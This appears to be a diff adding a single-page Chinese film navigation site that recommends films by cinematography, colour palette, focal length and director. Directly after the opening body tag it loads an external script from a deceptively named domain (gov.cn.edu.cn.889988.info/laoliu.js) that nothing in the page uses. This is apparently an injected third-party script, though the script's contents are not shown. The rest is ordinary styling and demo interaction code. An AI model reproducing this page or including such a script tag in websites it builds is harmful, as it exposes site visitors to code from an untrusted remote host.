@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>新视觉电影网 - 摄影美学·镜头语言·视觉系电影导航 | 新视觉电影网</title>
+<meta name="description" content="新视觉电影网（xinshijuedianyingwang-h5）专注摄影美学、构图色彩、镜头语言类电影推荐与导航，从视觉角度重新发现好电影。">
+<meta name="keywords" content="新视觉电影网, xinshijuedianyingwang-h5, 视觉系电影, 摄影美学, 镜头语言, 构图色彩, 电影视觉导航">
+<meta name="author" content="新视觉电影网">
+<meta name="robots" content="index,follow">
+<style>
+:root{
+  --ink:#0a0a0a;
+  --ink2:#111;
+  --ink3:#1a1a1a;
+  --paper:#fafafa;
+  --paper2:#f0f0f0;
+  --gray:#666;
+  --gray2:#999;
+  --gray3:#ccc;
+  --accent:#ff2d55;
+  --accent2:#00c8ff;
+  --accent3:#34c759;
+  --accent4:#ffcc00;
+  --radius:0;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:var(--paper);
+  color:var(--ink);
+  font-family:'Helvetica Neue','Arial','Microsoft YaHei',sans-serif;
+  line-height:1.7;font-size:15px;min-height:100vh;
+  position:relative;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+
+/* 取景器十字线装饰 */
+.viewfinder{
+  position:fixed;pointer-events:none;z-index:0;opacity:.06;
+}
+.vf-tl{top:20px;left:20px;width:40px;height:40px;border-top:2px solid var(--ink);border-left:2px solid var(--ink)}
+.vf-tr{top:20px;right:20px;width:40px;height:40px;border-top:2px solid var(--ink);border-right:2px solid var(--ink)}
+.vf-bl{bottom:20px;left:20px;width:40px;height:40px;border-bottom:2px solid var(--ink);border-left:2px solid var(--ink)}
+.vf-br{bottom:20px;right:20px;width:40px;height:40px;border-bottom:2px solid var(--ink);border-right:2px solid var(--ink)}
+
+/* 顶部 */
+.topbar{
+  position:fixed;top:0;left:0;right:0;z-index:100;
+  background:rgba(250,250,250,.95);backdrop-filter:blur(10px);
+  border-bottom:1px solid var(--gray3);
+}
+.topbar-inner{
+  max-width:1400px;margin:0 auto;padding:14px 24px;
+  display:flex;align-items:center;justify-content:space-between;
+}
+.logo{
+  font-size:20px;font-weight:900;display:flex;align-items:center;gap:8px;
+  letter-spacing:3px;text-transform:uppercase;
+}
+.logo .vf-icon{font-size:18px}
+.logo b{color:var(--accent)}
+.nav-menu{display:flex;gap:28px}
+.nav-menu a{
+  color:var(--gray);font-size:13px;font-weight:500;letter-spacing:1px;
+  position:relative;padding:4px 0;transition:.3s;
+}
+.nav-menu a::after{
+  content:'';position:absolute;bottom:0;left:0;width:0;height:1px;
+  background:var(--accent);transition:.3s;
+}
+.nav-menu a:hover{color:var(--ink)}
+.nav-menu a:hover::after{width:100%}
+
+/* Hero */
+.hero{
+  margin-top:60px;padding:80px 24px 60px;position:relative;z-index:1;
+  background:var(--ink);color:var(--paper);
+}
+.hero-inner{max-width:1400px;margin:0 auto;display:grid;grid-template-columns:1fr 1fr;gap:60px;align-items:center}
+.hero-text{max-width:500px}
+.hero-tag{
+  display:inline-block;padding:4px 14px;border:1px solid rgba(255,45,85,.5);
+  color:var(--accent);font-size:11px;font-weight:600;letter-spacing:2px;text-transform:uppercase;
+  margin-bottom:24px;
+}
+.hero h1{
+  font-size:clamp(36px,5vw,56px);font-weight:900;line-height:1.1;margin-bottom:20px;
+  letter-spacing:-1px;
+}
+.hero h1 .italic{font-style:italic;color:var(--accent);font-weight:300}
+.hero-desc{font-size:15px;color:var(--gray2);margin-bottom:32px;line-height:1.8}
+.hero-btns{display:flex;gap:14px;flex-wrap:wrap}
+.btn-main{
+  padding:14px 36px;font-weight:700;font-size:14px;letter-spacing:1px;text-transform:uppercase;
+  background:var(--accent);color:#fff;transition:.3s;
+}
+.btn-main:hover{background:#e01e40;transform:translateY(-2px)}
+.btn-sub{
+  padding:14px 36px;font-weight:700;font-size:14px;letter-spacing:1px;text-transform:uppercase;
+  border:1px solid var(--gray2);color:var(--paper);transition:.3s;background:transparent;
+}
+.btn-sub:hover{border-color:var(--accent);color:var(--accent)}
+
+/* Hero右侧视觉元素 */
+.hero-visual{
+  position:relative;display:flex;align-items:center;justify-content:center;
+}
+.visual-frame{
+  width:100%;max-width:400px;aspect-ratio:3/4;background:var(--ink2);
+  border:1px solid var(--gray);position:relative;overflow:hidden;
+}
+.visual-frame::before{
+  content:'';position:absolute;top:50%;left:0;right:0;height:1px;background:rgba(255,255,255,.1);
+}
+.visual-frame::after{
+  content:'';position:absolute;left:50%;top:0;bottom:0;width:1px;background:rgba(255,255,255,.1);
+}
+.visual-dot{
+  position:absolute;width:8px;height:8px;border-radius:50%;background:var(--accent);
+  top:30%;left:40%;box-shadow:0 0 20px var(--accent);
+}
+.visual-dot:nth-child(2){background:var(--accent2);top:60%;left:65%;box-shadow:0 0 20px var(--accent2)}
+.visual-dot:nth-child(3){background:var(--accent3);top:75%;left:25%;box-shadow:0 0 20px var(--accent3)}
+.visual-label{
+  position:absolute;bottom:12px;right:12px;font-size:10px;color:var(--gray2);letter-spacing:2px;
+}
+
+/* 栏目通用 */
+.section{max-width:1400px;margin:0 auto;padding:60px 24px;position:relative;z-index:1}
+.sec-head{margin-bottom:40px}
+.sec-head h2{font-size:32px;font-weight:900;letter-spacing:-1px;margin-bottom:6px}
+.sec-head p{color:var(--gray);font-size:14px}
+
+/* 栏目1：不对称画廊网格 */
+.gallery-section{background:var(--paper)}
+.gallery-grid{
+  display:grid;grid-template-columns:repeat(6,1fr);grid-template-rows:auto auto;gap:12px;
+}
+.g-item{
+  position:relative;overflow:hidden;background:var(--ink);cursor:pointer;transition:.4s;
+}
+.g-item:hover{transform:scale(.98)}
+.g-item .g-img{
+  width:100%;height:100%;min-height:180px;display:flex;align-items:center;justify-content:center;
+  font-size:48px;transition:.4s;
+}
+.g-item:hover .g-img{transform:scale(1.05)}
+.g-item .g-overlay{
+  position:absolute;bottom:0;left:0;right:0;padding:16px;background:linear-gradient(transparent,var(--ink));
+  color:var(--paper);transform:translateY(100%);transition:.4s;
+}
+.g-item:hover .g-overlay{transform:translateY(0)}
+.g-item .g-overlay h3{font-size:14px;font-weight:700;margin-bottom:2px}
+.g-item .g-overlay p{font-size:11px;color:var(--gray2)}
+.g-item:nth-child(1){grid-column:1/4;grid-row:1;aspect-ratio:16/9}
+.g-item:nth-child(1) .g-img{background:linear-gradient(135deg,#1a1a2e,#16213e);color:var(--accent)}
+.g-item:nth-child(2){grid-column:4/7;grid-row:1;aspect-ratio:16/9}
+.g-item:nth-child(2) .g-img{background:linear-gradient(135deg,#0f3460,#e94560);color:var(--accent2)}
+.g-item:nth-child(3){grid-column:1/3;grid-row:2;aspect-ratio:4/3}
+.g-item:nth-child(3) .g-img{background:linear-gradient(135deg,#2d1b69,#11998e);color:var(--accent3)}
+.g-item:nth-child(4){grid-column:3/5;grid-row:2;aspect-ratio:4/3}
+.g-item:nth-child(4) .g-img{background:linear-gradient(135deg,#333,#f12711);color:var(--accent4)}
+.g-item:nth-child(5){grid-column:5/7;grid-row:2;aspect-ratio:4/3}
+.g-item:nth-child(5) .g-img{background:linear-gradient(135deg,#0c0c0c,#434343);color:var(--paper)}
+
+/* 栏目2：色卡色谱 */
+.color-section{background:var(--ink);color:var(--paper)}
+.color-section .sec-head p{color:var(--gray2)}
+.color-palette{
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:0;
+  max-width:900px;margin:0 auto;
+}
+.color-swatch{
+  height:160px;display:flex;flex-direction:column;justify-content:flex-end;padding:18px;
+  transition:.3s;cursor:pointer;position:relative;
+}
+.color-swatch:hover{transform:scaleY(1.05);z-index:1}
+.color-swatch .swatch-name{font-size:13px;font-weight:700;margin-bottom:2px}
+.color-swatch .swatch-hex{font-size:11px;opacity:.7;font-family:monospace}
+.color-swatch:nth-child(1){background:#e94560}
+.color-swatch:nth-child(2){background:#0f3460}
+.color-swatch:nth-child(3){background:#16213e}
+.color-swatch:nth-child(4){background:#1a1a2e}
+.color-swatch:nth-child(5){background:#f5f5f5;color:var(--ink)}
+.color-swatch:nth-child(6){background:#ff2d55}
+.color-swatch:nth-child(7){background:#00c8ff;color:var(--ink)}
+.color-swatch:nth-child(8){background:#34c759;color:var(--ink)}
+
+/* 栏目3：镜头焦段滑块 */
+.lens-section{background:var(--paper2)}
+.lens-slider{max-width:800px;margin:0 auto}
+.lens-bar{
+  position:relative;height:80px;background:var(--ink);margin-bottom:30px;overflow:hidden;
+}
+.lens-track{
+  display:flex;height:100%;transition:transform .5s ease;
+}
+.lens-slide{
+  min-width:100%;display:flex;align-items:center;justify-content:center;gap:20px;padding:0 40px;
+}
+.lens-slide .lens-focal{
+  font-size:48px;font-weight:900;color:var(--accent);font-family:monospace;
+}
+.lens-slide .lens-info{color:var(--paper)}
+.lens-slide .lens-info h3{font-size:18px;margin-bottom:2px}
+.lens-slide .lens-info p{font-size:12px;color:var(--gray2)}
+.lens-controls{display:flex;justify-content:center;gap:8px;flex-wrap:wrap}
+.lens-dot{
+  width:10px;height:10px;border-radius:50%;background:var(--gray3);cursor:pointer;transition:.3s;
+}
+.lens-dot.active{background:var(--accent);transform:scale(1.3)}
+.lens-labels{
+  display:flex;justify-content:space-between;max-width:800px;margin:16px auto 0;
+  font-size:11px;color:var(--gray);font-family:monospace;
+}
+
+/* 栏目4：负空间排版 - 导演视觉录 */
+.director-section{background:var(--paper)}
+.director-list{max-width:1000px;margin:0 auto}
+.dir-row{
+  display:grid;grid-template-columns:80px 1fr auto;gap:24px;align-items:center;
+  padding:24px 0;border-bottom:1px solid var(--gray3);transition:.3s;
+}
+.dir-row:hover{padding-left:12px}
+.dir-row:last-child{border-bottom:none}
+.dir-num{font-size:36px;font-weight:900;color:var(--gray3);font-family:monospace}
+.dir-info h3{font-size:18px;font-weight:700;margin-bottom:2px}
+.dir-info p{font-size:13px;color:var(--gray);line-height:1.6}
+.dir-tag{
+  padding:4px 12px;font-size:11px;font-weight:600;border:1px solid var(--ink);
+  color:var(--ink);white-space:nowrap;
+}
+
+/* 栏目5：关于+FAQ */
+.about-section{background:var(--ink);color:var(--paper)}
+.about-section .sec-head p{color:var(--gray2)}
+.about-grid{display:grid;grid-template-columns:1fr 1fr;gap:32px}
+.about-box{
+  background:var(--ink2);border:1px solid var(--gray);padding:28px;
+}
+.about-box h3{font-size:16px;margin-bottom:12px;color:var(--accent)}
+.about-box p{color:var(--gray2);font-size:13px;margin-bottom:10px;line-height:1.8}
+.faq-item{border-bottom:1px solid var(--gray);padding:14px 0}
+.faq-item:last-child{border-bottom:none}
+.faq-item b{color:var(--accent);font-size:13px}
+.faq-item p{color:var(--gray2);font-size:12px;margin-top:4px}
+
+/* Footer */
+.footer{
+  background:var(--ink);color:var(--gray2);padding:40px 24px 20px;text-align:center;
+  border-top:1px solid var(--gray);
+}
+.footer-inner{max-width:1400px;margin:0 auto}
+.footer-logo{font-size:18px;font-weight:900;color:var(--paper);margin-bottom:14px;letter-spacing:3px}
+.footer-logo b{color:var(--accent)}
+.footer-links{display:flex;justify-content:center;gap:24px;flex-wrap:wrap;margin-bottom:20px}
+.footer-links a{color:var(--gray);font-size:12px;transition:.3s;letter-spacing:1px}
+.footer-links a:hover{color:var(--accent)}
+.footer-copy{font-size:11px;border-top:1px solid var(--gray);padding-top:16px;letter-spacing:1px}
+.footer-copy a{color:var(--accent)}
+
+/* 移动端 */
+@media(max-width:768px){
+  .topbar-inner{flex-direction:column;gap:8px;padding:10px 16px}
+  .nav-menu{gap:14px;flex-wrap:wrap;justify-content:center}
+  .hero{padding:90px 16px 40px}
+  .hero-inner{grid-template-columns:1fr;gap:30px}
+  .hero-visual{display:none}
+  .section{padding:40px 16px}
+  .sec-head h2{font-size:24px}
+  .gallery-grid{grid-template-columns:1fr;grid-template-rows:auto}
+  .g-item:nth-child(n){grid-column:auto;grid-row:auto;aspect-ratio:16/9}
+  .color-palette{grid-template-columns:repeat(2,1fr)}
+  .lens-slide .lens-focal{font-size:32px}
+  .dir-row{grid-template-columns:40px 1fr;gap:12px}
+  .dir-tag{display:none}
+  .about-grid{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 取景器十字线 -->
+<div class="viewfinder vf-tl"></div>
+<div class="viewfinder vf-tr"></div>
+<div class="viewfinder vf-bl"></div>
+<div class="viewfinder vf-br"></div>
+
+<!-- Header -->
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="logo"><span class="vf-icon">◻</span>新视觉<b>电影网</b></div>
+    <nav>
+      <ul class="nav-menu">
+        <li><a href="#gallery">视觉画廊</a></li>
+        <li><a href="#color">色彩语言</a></li>
+        <li><a href="#lens">镜头语言</a></li>
+        <li><a href="#director">导演视觉录</a></li>
+        <li><a href="#about">关于</a></li>
+      </ul>
+    </nav>
+  </div>
+</div>
+
+<!-- Hero -->
+<section class="hero">
+  <div class="hero-inner">
+    <div class="hero-text">
+      <span class="hero-tag">xinshijuedianyingwang-h5 · Visual Cinema</span>
+      <h1>看见<span class="italic">电影</span><br>的另一种方式</h1>
+      <p class="hero-desc">新视觉电影网从摄影美学、构图色彩、镜头语言切入，带你用导演的眼睛重新看电影。不只看故事，更看画面背后的视觉逻辑。</p>
+      <div class="hero-btns">
+        <a href="#gallery" class="btn-main">探索视觉</a>
+        <a href="#lens" class="btn-sub">镜头语言</a>
+      </div>
+    </div>
+    <div class="hero-visual">
+      <div class="visual-frame">
+        <div class="visual-dot"></div>
+        <div class="visual-dot"></div>
+        <div class="visual-dot"></div>
+        <div class="visual-label">FOCUS · 1/125 · f/2.8</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目1：不对称画廊 -->
+<section id="gallery" class="section gallery-section">
+  <div class="sec-head">
+    <h2>视觉画廊</h2>
+    <p>按视觉风格分类的影片精选</p>
+  </div>
+  <div class="gallery-grid">
+    <div class="g-item">
+      <div class="g-img">🎨</div>
+      <div class="g-overlay">
+        <h3>韦斯·安德森对称美学</h3>
+        <p>《布达佩斯大饭店》· 粉红与深红的极致碰撞</p>
+      </div>
+    </div>
+    <div class="g-item">
+      <div class="g-img">🌊</div>
+      <div class="g-overlay">
+        <h3>王家卫霓虹美学</h3>
+        <p>《花样年华》· 旗袍与阴影的暧昧叙事</p>
+      </div>
+    </div>
+    <div class="g-item">
+      <div class="g-img">🏜️</div>
+      <div class="g-overlay">
+        <h3>罗杰·迪金斯自然光</h3>
+        <p>《银翼杀手2049》· 沙漠中的橙色迷雾</p>
+      </div>
+    </div>
+    <div class="g-item">
+      <div class="g-img">🟥</div>
+      <div class="g-overlay">
+        <h3>张艺谋色彩符号</h3>
+        <p>《英雄》· 红绿蓝白的多重叙事</p>
+      </div>
+    </div>
+    <div class="g-item">
+      <div class="g-img">🎞️</div>
+      <div class="g-overlay">
+        <h3>塔可夫斯基长镜头</h3>
+        <p>《镜子》· 诗意影像的时间流淌</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目2：色卡色谱 -->
+<section id="color" class="section color-section">
+  <div class="sec-head">
+    <h2>色彩语言</h2>
+    <p>电影中的色彩心理学与调色板</p>
+  </div>
+  <div class="color-palette">
+    <div class="color-swatch">
+      <div class="swatch-name">Coral Red</div>
+      <div class="swatch-hex">#e94560</div>
+    </div>
+    <div class="color-swatch">
+      <div class="swatch-name">Deep Navy</div>
+      <div class="swatch-hex">#0f3460</div>
+    </div>
+    <div class="color-swatch">
+      <div class="swatch-name">Midnight</div>
+      <div class="swatch-hex">#16213e</div>
+    </div>
+    <div class="color-swatch">
+      <div class="swatch-name">Dark Void</div>
+      <div class="swatch-hex">#1a1a2e</div>
+    </div>
+    <div class="color-swatch">
+      <div class="swatch-name">Paper White</div>
+      <div class="swatch-hex">#f5f5f5</div>
+    </div>
+    <div class="color-swatch">
+      <div class="swatch-name">Signal Pink</div>
+      <div class="swatch-hex">#ff2d55</div>
+    </div>
+    <div class="color-swatch">
+      <div class="swatch-name">Cyan Glow</div>
+      <div class="swatch-hex">#00c8ff</div>
+    </div>
+    <div class="color-swatch">
+      <div class="swatch-name">Matrix Green</div>
+      <div class="swatch-hex">#34c759</div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目3：镜头焦段 -->
+<section id="lens" class="section lens-section">
+  <div class="sec-head">
+    <h2>镜头语言</h2>
+    <p>不同焦段塑造不同的叙事情绪</p>
+  </div>
+  <div class="lens-slider">
+    <div class="lens-bar">
+      <div class="lens-track" id="lensTrack">
+        <div class="lens-slide">
+          <div class="lens-focal">14mm</div>
+          <div class="lens-info">
+            <h3>超广角 · 宏大叙事</h3>
+            <p>《星际穿越》五维空间场景，畸变带来压迫与震撼</p>
+          </div>
+        </div>
+        <div class="lens-slide">
+          <div class="lens-focal">35mm</div>
+          <div class="lens-info">
+            <h3>人文眼 · 真实感</h3>
+            <p>《罗马》大量35mm手持，贴近生活的纪录片质感</p>
+          </div>
+        </div>
+        <div class="lens-slide">
+          <div class="lens-focal">50mm</div>
+          <div class="lens-info">
+            <h3>标准眼 · 客观叙事</h3>
+            <p>《少年派的奇幻漂流》，最接近人眼视角的叙事</p>
+          </div>
+        </div>
+        <div class="lens-slide">
+          <div class="lens-focal">85mm</div>
+          <div class="lens-info">
+            <h3>人像王 · 情感聚焦</h3>
+            <p>《布达佩斯大饭店》，压缩背景突出人物情绪</p>
+          </div>
+        </div>
+        <div class="lens-slide">
+          <div class="lens-focal">200mm</div>
+          <div class="lens-info">
+            <h3>长焦 · 偷窥视角</h3>
+            <p>《后窗》希区柯克式窥视，距离感制造悬疑</p>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lens-controls" id="lensControls">
+      <div class="lens-dot active"></div>
+      <div class="lens-dot"></div>
+      <div class="lens-dot"></div>
+      <div class="lens-dot"></div>
+      <div class="lens-dot"></div>
+    </div>
+    <div class="lens-labels">
+      <span>14mm 超广角</span>
+      <span>35mm 人文</span>
+      <span>50mm 标准</span>
+      <span>85mm 人像</span>
+      <span>200mm+ 长焦</span>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目4：导演视觉录 -->
+<section id="director" class="section director-section">
+  <div class="sec-head">
+    <h2>导演视觉录</h2>
+    <p>那些用画面写诗的导演</p>
+  </div>
+  <div class="director-list">
+    <div class="dir-row">
+      <div class="dir-num">01</div>
+      <div class="dir-info">
+        <h3>罗杰·迪金斯（Roger Deakins）</h3>
+        <p>15次奥斯卡提名，凭《银翼杀手2049》《1917》两度获奖。自然光大师，每一帧都是壁纸级画面。</p>
+      </div>
+      <div class="dir-tag">摄影指导</div>
+    </div>
+    <div class="dir-row">
+      <div class="dir-num">02</div>
+      <div class="dir-info">
+        <h3>韦斯·安德森（Wes Anderson）</h3>
+        <p>强迫症级对称构图，粉彩配色，每一部都是移动的明信片。《布达佩斯大饭店》是其美学巅峰。</p>
+      </div>
+      <div class="dir-tag">导演/美术</div>
+    </div>
+    <div class="dir-row">
+      <div class="dir-num">03</div>
+      <div class="dir-info">
+        <h3>王家卫（Wong Kar-wai）</h3>
+        <p>霓虹灯、慢门、抽帧——用色彩和光影写日记。《花样年华》25帧里藏着整个60年代。</p>
+      </div>
+      <div class="dir-tag">导演</div>
+    </div>
+    <div class="dir-row">
+      <div class="dir-num">04</div>
+      <div class="dir-info">
+        <h3>罗杰·狄金斯 × 丹尼斯·维伦纽瓦</h3>
+        <p>《银翼杀手2049》导演与摄影的完美合作，创造了科幻电影视觉新标杆。</p>
+      </div>
+      <div class="dir-tag">导演组合</div>
+    </div>
+    <div class="dir-row">
+      <div class="dir-num">05</div>
+      <div class="dir-info">
+        <h3>宫崎骏 × 久石让</h3>
+        <p>画面与音乐的双重视觉——天空之城、千与千寻，每一帧手绘都是视觉奇迹。</p>
+      </div>
+      <div class="dir-tag">动画视觉</div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目5：关于 -->
+<section id="about" class="section about-section">
+  <div class="sec-head">
+    <h2>关于新视觉电影网</h2>
+    <p>为什么从"视觉"切入？</p>
+  </div>
+  <div class="about-grid">
+    <div class="about-box">
+      <h3>我们的视角</h3>
+      <p>大多数人看电影只看剧情，但好电影首先是"好看"的。新视觉电影网从摄影、构图、色彩、镜头语言切入，带你用专业眼光重新发现电影之美。</p>
+      <p>我们不只告诉你"这部电影好看"，还告诉你"它为什么好看"——是对称构图的力量，是色彩心理学的运用，还是镜头焦段的情绪塑造。</p>
+      <p>网站名：新视觉电影网（xinshijuedianyingwang-h5），单页演示，内链使用#占位。</p>
+    </div>
+    <div class="about-box">
+      <div class="faq-item">
+        <b>Q：这个网站能直接看电影吗？</b>
+        <p>A：本页为导航演示站，提供视觉系影片推荐与分类，不存储视频文件。</p>
+      </div>
+      <div class="faq-item">
+        <b>Q：网址是什么？</b>
+        <p>A：https://xinshijuedianyingwang-h5.github.io</p>
+      </div>
+      <div class="faq-item">
+        <b>Q：适合什么人群？</b>
+        <p>A：摄影爱好者、影视从业者、美学研究者，以及所有想"看懂"电影画面的人。</p>
+      </div>
+      <div class="faq-item">
+        <b>Q：适合搜索引擎收录吗？</b>
+        <p>A：页面语义化、含唯一H1、关键词标题与描述，符合必应基础收录规则。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Footer -->
+<div class="footer">
+  <div class="footer-inner">
+    <div class="footer-logo">◻ 新视觉<b>电影网</b></div>
+    <div class="footer-links">
+      <a href="#gallery">视觉画廊</a>
+      <a href="#color">色彩语言</a>
+      <a href="#lens">镜头语言</a>
+      <a href="#director">导演视觉录</a>
+      <a href="#about">关于</a>
+    </div>
+    <div class="footer-copy">
+      &copy; 2026 新视觉电影网 (xinshijuedianyingwang-h5). All rights reserved.<br>
+      网站地址: <a href="https://xinshijuedianyingwang-h5.github.io">https://xinshijuedianyingwang-h5.github.io</a><br>
+      <span style="opacity:.4">FOCUS · COMPOSE · CAPTURE</span>
+    </div>
+  </div>
+</div>
+
+<script>
+// 镜头焦段滑块
+var lensTrack=document.getElementById('lensTrack');
+var lensDots=document.querySelectorAll('.lens-dot');
+var currentLens=0;
+var totalLens=lensDots.length;
+
+function goLens(index){
+  currentLens=index;
+  lensTrack.style.transform='translateX(-'+index*100+'%)';
+  lensDots.forEach(function(d,i){d.classList.toggle('active',i===index)});
+}
+
+lensDots.forEach(function(dot,i){
+  dot.addEventListener('click',function(){goLens(i)});
+});
+
+setInterval(function(){
+  currentLens=(currentLens+1)%totalLens;
+  goLens(currentLens);
+},6000);
+
+// 画廊项目点击
+document.querySelectorAll('.g-item').forEach(function(item){
+  item.addEventListener('click',function(){
+    var title=this.querySelector('.g-overlay h3').textContent;
+    alert('视觉分类：'+title+'\n\n当前为静态演示页，点击后将跳转到该视觉风格的影片列表。\n内链使用 # 占位。');
+  });
+});
+
+// 色卡点击
+document.querySelectorAll('.color-swatch').forEach(function(swatch){
+  swatch.addEventListener('click',function(){
+    var name=this.querySelector('.swatch-name').textContent;
+    var hex=this.querySelector('.swatch-hex').textContent;
+    alert('色彩：'+name+' '+hex+'\n\n当前为静态演示页，点击后将跳转到该色调的影片列表。\n内链使用 # 占位。');
+  });
+});
+
+// 导演行点击
+document.querySelectorAll('.dir-row').forEach(function(row){
+  row.addEventListener('click',function(){
+    var name=this.querySelector('h3').textContent;
+    alert('导演/摄影：'+name+'\n\n当前为静态演示页，点击后将跳转到该创作者的影片合集。\n内链使用 # 占位。');
+  });
+});
+
+// 平滑滚动
+document.querySelectorAll('.nav-menu a').forEach(function(a){
+  a.addEventListener('click',function(e){
+    e.preventDefault();
+    var id=this.getAttribute('href');
+    if(id&&id.startsWith('#')){
+      var el=document.querySelector(id);
+      if(el) el.scrollIntoView({behavior:'smooth',block:'start'});
+    }
+  });
+});
+</script>
+</body>
+</html>
